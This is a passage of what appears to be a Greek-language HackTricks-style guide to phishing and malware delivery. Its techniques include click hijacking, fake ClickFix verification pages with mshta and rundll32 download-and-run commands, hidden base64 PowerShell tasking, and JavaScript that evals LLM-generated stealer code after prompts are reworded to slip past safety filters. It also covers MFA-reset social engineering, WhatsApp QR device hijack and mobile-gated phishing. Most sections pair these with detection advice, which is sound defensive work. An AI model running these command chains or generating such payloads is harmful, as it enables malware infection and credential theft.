if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Βασικά χαρακτηριστικά:
- Το hook συνήθως εκτελείται στη **capture phase** (`true`) στο `document`, επομένως ενεργοποιείται πριν από τα site handlers.
- Το Chrome χρησιμοποιεί συχνά `mousedown` αντί για `click`, ώστε η redirect να παραμένει συνδεδεμένη με ένα έγκυρο **user gesture** και να βελτιώνεται η παράκαμψη των popup blockers.
- Ορισμένες παραλλαγές ανοίγουν εκ των προτέρων το `about:blank` ή δημιουργούν clicks σε `<a target="_blank">` και αναθέτουν το TDS URL μόνο αργότερα.
- Τα browser-side όρια αποθηκεύονται συχνά στο `localStorage`, επομένως το **πρώτο click** μπορεί να οδηγήσει στο malware, ενώ τα refresh/retry επιστρέφουν στο εμφανιζόμενο link που φαίνεται benign.
- Το TDS μπορεί να εφαρμόζει ελέγχους βάσει referrer, domain εισόδου, GEO, browser/device fingerprint, ελέγχων VPN/datacenter, click context και counters ανά session, καθιστώντας τα replays των analysts μη ντετερμινιστικά.

Ιδέες για Defenders:
- Συγκρίνετε το **εμφανιζόμενο** `href` με τον **πραγματικό** προορισμό πλοήγησης που δημιουργείται τη στιγμή του click.
- Αναζητήστε handlers `document.addEventListener(..., true)` που καλούν ταυτόχρονα `preventDefault()` και `stopImmediatePropagation()` γύρω από `window.open`, `about:blank` ή synthetic anchor clicks.
- Αντιμετωπίστε συστάδες από πρόσφατα registered domains για software downloads, τα οποία φορτώνουν όλα το ίδιο CloudFront/JS stage, ως pattern SEO-poisoning/TDS υψηλής ένδειξης.

### ClickFix από fake verification pages + fetches που μοιάζουν με archives μέσω LOLBAS
Ορισμένα branches του TDS καταλήγουν σε μια fake verification page (τύπου Cloudflare/IUAM), η οποία ζητά από το θύμα να εκτελέσει ένα trusted Windows binary, όπως:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Σημειώσεις:
- Το `mshta.exe` εκτελεί το **HTA/VBScript στην αρχή της απόκρισης**, ακόμη και αν το URL προσποιείται ότι είναι αρχείο `.7z`; τα προσαρτημένα δεδομένα του archive μπορεί να είναι καθαρό decoy.
- Τα επόμενα στάδια συχνά συνεχίζουν να παραποιούν τον τύπο αρχείου (`.rtf` για PowerShell, `.asar` για Python, ZIP με binaries με padding) και στη συνέχεια μεταβαίνουν σε **manual PE mapping / in-memory execution**.
- Αν ανταποκρίνεστε σε μία από αυτές τις αλυσίδες, διατηρήστε το **network + memory από την πρώτη επιτυχημένη εκτέλεση**: οι επόμενες επαναλήψεις μπορεί να εμφανίζουν μόνο μια benign διαδρομή installer/SFX ή να αποτυγχάνουν επειδή η αποδέσμευση του payload/key ήταν συνδεδεμένη με το αρχικό TDS session.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Δόλωμα: cloned εθνική οδηγία CERT με ένα κουμπί **Update**, το οποίο εμφανίζει αναλυτικές οδηγίες “fix”. Τα θύματα καλούνται να εκτελέσουν ένα batch που κατεβάζει ένα DLL και το εκτελεί μέσω `rundll32`.<sup>[[12]](#references)</sup>
* Τυπική batch chain που παρατηρήθηκε:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* Το `Invoke-WebRequest` αποθηκεύει το payload στο `%TEMP%`, ένα σύντομο sleep αποκρύπτει το network jitter και στη συνέχεια το `rundll32` καλεί το exported entrypoint (`notepad`).
* Το DLL στέλνει beacon με την ταυτότητα του host και κάνει polling στο C2 κάθε λίγα λεπτά. Το remote tasking αποστέλλεται ως **base64-encoded PowerShell**, το οποίο εκτελείται κρυφά και με policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Αυτό διατηρεί την ευελιξία του C2 (ο server μπορεί να αλλάζει tasks χωρίς να ενημερώνει το DLL) και αποκρύπτει τα console windows. Αναζητήστε PowerShell children του `rundll32.exe` που χρησιμοποιούν μαζί `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Οι defenders μπορούν να αναζητήσουν HTTP(S) callbacks της μορφής `...page.php?tynor=<COMPUTER>sss<USER>` και polling intervals 5 λεπτών μετά τη φόρτωση του DLL.

---

## Phishing Operations με ενίσχυση από AI
Οι attackers πλέον συνδυάζουν **LLM & voice-clone APIs** για πλήρως εξατομικευμένα δολώματα και interaction σε πραγματικό χρόνο.

| Επίπεδο | Παράδειγμα χρήσης από threat actor |
|-------|-------------|
|Automation|Δημιουργία και αποστολή >100 χιλ. emails / SMS με τυχαιοποιημένη διατύπωση και tracking links.|
|Generative AI|Παραγωγή *one-off* emails που αναφέρονται σε δημόσιες M&A, εσωτερικά αστεία από social media και deep-fake φωνή CEO σε callback scam.|
|Agentic AI|Αυτόνομη καταχώριση domains, συλλογή open-source intel και σύνταξη emails επόμενου σταδίου όταν ένα θύμα κάνει click αλλά δεν υποβάλλει credentials.|

**Defence:**
• Προσθέστε **dynamic banners** που επισημαίνουν μηνύματα τα οποία αποστέλλονται από untrusted automation (μέσω ανωμαλιών ARC/DKIM).
• Υλοποιήστε **voice-biometric challenge phrases** για τηλεφωνικά αιτήματα υψηλού κινδύνου.
• Εκτελείτε συνεχείς προσομοιώσεις AI-generated δολωμάτων σε awareness programmes – τα static templates είναι πλέον obsolete.

Δείτε επίσης – agentic browsing abuse για credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Δείτε επίσης – AI agent abuse τοπικών CLI tools και MCP (για secrets inventory και detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly phishing JavaScript (in-browser codegen)

Οι attackers μπορούν να διανέμουν HTML που φαίνεται benign και να **παράγουν τον stealer κατά το runtime**, ζητώντας JavaScript από ένα **trusted LLM API** και στη συνέχεια εκτελώντας το στον browser (π.χ. `eval` ή dynamic `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** Κωδικοποιήστε exfil URLs/Base64 strings στο prompt· επαναλάβετε τη διατύπωση για να παρακάμψετε τα safety filters και να μειώσετε τις hallucinations.
2. **Client-side API call:** Κατά το load, η JS καλεί ένα public LLM (Gemini/DeepSeek/etc.) ή ένα CDN proxy· μόνο το prompt/API call υπάρχει στο static HTML.
3. **Assemble & exec:** Συνενώστε την απόκριση και εκτελέστε την (polymorphic σε κάθε επίσκεψη):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** ο generated code εξατομικεύει το lure (π.χ., parsing του LogoKit token) και κάνει POST τα creds στο prompt-hidden endpoint.

**Evasion traits**
- Η κίνηση περνά από γνωστά LLM domains ή αξιόπιστα CDN proxies· μερικές φορές μέσω WebSockets προς ένα backend.
- Δεν υπάρχει static payload· το κακόβουλο JS υπάρχει μόνο μετά το render.
- Οι non-deterministic generations παράγουν **unique stealers ανά session**.

**Detection ideas**
- Εκτέλεση sandboxes με ενεργοποιημένο JS· επισήμανση **runtime `eval`/dynamic script creation που προέρχεται από LLM responses**.
- Αναζήτηση για front-end POSTs προς LLM APIs που ακολουθούνται άμεσα από `eval`/`Function` στο returned text.
- Alert για unsanctioned LLM domains στην client traffic και επακόλουθα credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Εκτός από το κλασικό push-bombing, οι operators απλώς **επιβάλλουν νέα MFA registration** κατά τη διάρκεια της κλήσης στο help desk, ακυρώνοντας το υπάρχον token του χρήστη. Οποιοδήποτε subsequent login prompt εμφανίζεται legitimate στο θύμα.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Παρακολουθείτε συμβάντα AzureAD/AWS/Okta όπου τα **`deleteMFA` + `addMFA`** πραγματοποιούνται **μέσα σε λίγα λεπτά από την ίδια IP**.



## Clipboard Hijacking / Pastejacking

Οι επιτιθέμενοι μπορούν να αντιγράψουν αθόρυβα κακόβουλες εντολές στο clipboard του θύματος από μια παραβιασμένη ή typosquatted web page και, στη συνέχεια, να εξαπατήσουν τον χρήστη ώστε να τις επικολλήσει μέσα στο **Win + R**, **Win + X** ή σε ένα παράθυρο terminal, εκτελώντας arbitrary code χωρίς κανένα download ή attachment.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Διανομή Malicious App (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Hijack σύνδεσης συσκευής WhatsApp μέσω QR social engineering
* Μια lure page (π.χ. ψεύτικο “channel” υπουργείου/CERT) εμφανίζει ένα QR του WhatsApp Web/Desktop και δίνει οδηγίες στο θύμα να το σαρώσει, προσθέτοντας αθόρυβα τον επιτιθέμενο ως **linked device**.<sup>[[12]](#references)</sup>
* Ο επιτιθέμενος αποκτά άμεσα ορατότητα σε chats/contacts μέχρι να αφαιρεθεί το session. Τα θύματα ενδέχεται αργότερα να δουν ειδοποίηση “new device linked”. Οι defenders μπορούν να αναζητούν απρόσμενα device-link events λίγο μετά από επισκέψεις σε μη αξιόπιστες QR pages.

### Mobile-gated phishing για την αποφυγή crawlers/sandboxes
Οι operators περιορίζουν ολοένα και περισσότερο τις phishing flows πίσω από έναν απλό έλεγχο συσκευής, ώστε οι desktop crawlers να μην φτάνουν ποτέ στις τελικές pages. Ένα συνηθισμένο pattern είναι ένα μικρό script που ελέγχει αν το DOM υποστηρίζει touch και κάνει post το αποτέλεσμα σε ένα server endpoint. Οι non-mobile clients λαμβάνουν HTTP 500 (ή μια κενή σελίδα), ενώ στους mobile users παρέχεται ολόκληρη η flow.<sup>[[7]](#references)</sup>

Minimal client snippet (τυπική λογική):
```html
<script src="/static/detect_device.js"></script>
```
Λογική του `detect_device.js` (απλοποιημένη):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Συχνά παρατηρούμενη συμπεριφορά Server:
- Ορίζει ένα session cookie κατά το πρώτο load.
- Αποδέχεται `POST /detect {"is_mobile":true|false}`.
- Επιστρέφει 500 (ή placeholder) σε επόμενα GET όταν `is_mobile=false`; σερβίρει phishing μόνο όταν `true`.

Heuristics για hunting και detection:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: ακολουθία `GET /static/detect_device.js` → `POST /detect` → HTTP 500 για non‑mobile· τα νόμιμα paths για mobile victims επιστρέφουν 200 με επακόλουθο HTML/JS.
- Κάντε block ή scrutinize σελίδες που εξαρτούν το περιεχόμενό τους αποκλειστικά από `ontouchstart` ή παρόμοιους ελέγχους συσκευής.

Συμβουλές άμυνας:
- Εκτελείτε crawlers με mobile-like fingerprints και ενεργοποιημένο JS, ώστε να αποκαλύπτεται gated content.
- Δημιουργήστε alert για ύποπτες αποκρίσεις 500 μετά από `POST /detect` σε domains που καταχωρίστηκαν πρόσφατα.

## References

- [1] [Δημιουργία παραλλαγών domains που χρησιμοποιούνται στο phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Εντοπισμός phishing: Εργαλεία και τεχνικές (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Κλοπή credentials και παράκαμψη 2FA με χρήση noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Κλοπή sessions και bypass του 2FA με EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Πώς να εγκαταστήσετε και να ρυθμίσετε το DKIM με Postfix στο Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Παγκόσμια έκθεση Unit 42 για Incident Response του 2025 - Edition κοινωνικής μηχανικής](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing - mobile-gated phishing infra και heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Το επόμενο σύνορο των Runtime Assembly Attacks: Αξιοποίηση LLMs για τη δημιουργία phishing JavaScript σε πραγματικό χρόνο](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking και TDS: Στο εσωτερικό ενός οικοσυστήματος διανομής malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting του Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Hijacking traffic προς το windows.com της Microsoft με bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually: Ψεύτικη dating app χρησιμοποιήθηκε ως δόλωμα σε στοχευμένη spyware campaign στο Πακιστάν](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoCs και samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
